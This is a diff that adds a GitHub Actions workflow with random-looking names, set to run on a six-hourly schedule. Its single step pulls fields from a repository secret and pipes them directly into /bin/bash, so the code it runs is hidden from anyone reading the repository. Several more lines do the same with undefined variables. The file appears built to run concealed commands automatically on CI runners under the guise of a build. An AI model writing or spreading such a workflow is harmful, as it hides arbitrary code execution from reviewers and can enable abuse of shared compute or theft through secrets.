@@ -1,0 +1,22 @@
+name: luomosanliangb
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luomosanliangb
+        env:
+          o85: ${{ secrets.o85 }}
+        run: |
+          echo $o85 | jq -r .chyon0 | /bin/bash
+          echo $s35 | jq -r .nxxmh04261 | /bin/bash
+          echo $v0 | jq -r .w46323 | /bin/bash
+          echo $gsx4261 | jq -r .appt730 | /bin/bash
+          echo $ivnlc068 | jq -r .mwlo620 | /bin/bash
+          echo $llc74821 | jq -r .dfd42719 | /bin/bash
+          echo $hmwpq3238 | jq -r .dg82397 | /bin/bash
+
